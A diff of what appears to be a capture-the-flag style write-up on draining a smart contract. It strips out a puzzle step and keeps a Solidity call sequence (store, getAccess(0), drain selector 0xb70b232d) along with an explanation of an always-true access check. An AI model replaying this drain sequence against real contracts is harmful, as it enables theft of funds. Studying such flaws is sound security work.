@@ -23,7 +23,6 @@ to see the contract structure and hidden functions.
 This reverse engineering revealed several critical insights:
 - Multiple hidden function selectors
 - Storage mappings for access control and state management
-- A puzzle-solving mechanism to unlock functionality
 - Multiple potential attack vectors
 
 ### 2. Key Contract Analysis Findings
@@ -40,7 +39,7 @@ bool _store; // STORAGE[0x4] - Store function enabler
 ```
 
 #### Critical Functions Discovered:
-- `0x3a279611` - Puzzle function requiring `[1,2,3,6]` input to enable store
+
 - `store()` - Storage function that activates various contract mechanisms  
 - `getAccess()` - Access control function with exploitable logical flaw
 - `0xb70b232d` - Primary drain function requiring elevated privileges
@@ -81,45 +80,34 @@ Through analysis and testing, I discovered **two different working methods** to 
 
 ---
 
-### Method 2: Sequential Puzzle-Based Attack (`FinalDrainScript.s.sol`)
+### Method 2: Sequential Attack (`FinalDrainScript.s.sol`)
 
-**Strategy:** Complete the full intended puzzle sequence to gain admin access.
+**Strategy:** Complete the full intended sequence.
 
-**Key Discovery:** The contract has a designed sequence requiring puzzle solving and access control exploitation:
+**Key Discovery:** The contract has a designed sequence requiring access control exploitation:
 
 ```solidity
-// Step 1: Solve the puzzle
-uint256[] memory puzzleInput = new uint256[](4);
-puzzleInput[0] = 1;
-puzzleInput[1] = 2;
-puzzleInput[2] = 3; // 1 + 2 = 3
-puzzleInput[3] = 6; // 3 * 2 = 6
 
-(bool puzzleSuccess, ) = TARGET_CONTRACT.call(
-    abi.encodeWithSelector(PUZZLE_SELECTOR, puzzleInput)
-);
-
-// Step 2: Activate status
+// Step 1: Activate status
 (bool storeSuccess, ) = TARGET_CONTRACT.call(
     abi.encodeWithSelector(STORE_SELECTOR, "status", uint256(1))
 );
 
-// Step 3: Exploit access control flaw
+// Step 2: Exploit access control flaw
 (bool accessSuccess, ) = TARGET_CONTRACT.call(
     abi.encodeWithSelector(GET_ACCESS_SELECTOR, uint256(0))
 );
 
-// Step 4: Drain as admin
+// Step 3: Drain as admin
 (bool drainSuccess, ) = TARGET_CONTRACT.call(
     abi.encodeWithSelector(DRAIN_SELECTOR)
 );
 ```
 
 **Attack Steps:**
-1. Solve puzzle with `[1,2,3,6]` to enable the store function
-2. Call `store("status", 1)` to activate admin/drain mechanisms
-3. Call `getAccess(0)` to exploit logical flaw and gain admin privileges
-4. Call `0xb70b232d` drain function as admin
+1. Call `store("status", 1)` to activate admin/drain mechanisms
+2. Call `getAccess(0)` to exploit logical flaw and gain admin privileges
+3. Call `0xb70b232d` drain function as admin
 
 **Result:** ✅ **SUCCESS**
 
@@ -167,17 +155,8 @@ function getAccess(uint256 _id) public nonPayable {
 
 The condition `uint256(_id ^ 0x42) == _id ^ 0x42` always evaluates to true, making `getAccess(0)` always grant admin privileges.
 
-#### 3. Puzzle Solution Bypass
-The puzzle function `0x3a279611` can be solved with the simple pattern `[1,2,3,6]`:
 
-```solidity
-// Requires: array[0] + array[1] == array[2] && array[2] * 2 == array[3]
-// Solution: 1 + 2 = 3, 3 * 2 = 6
-```
-
-This enables the `store` function which is required for several attack paths.
-
-#### 4. Administrative Drain Function
+#### 3. Administrative Drain Function
 Once any form of elevated access is obtained, the main drain function can be called:
 
 ```solidity
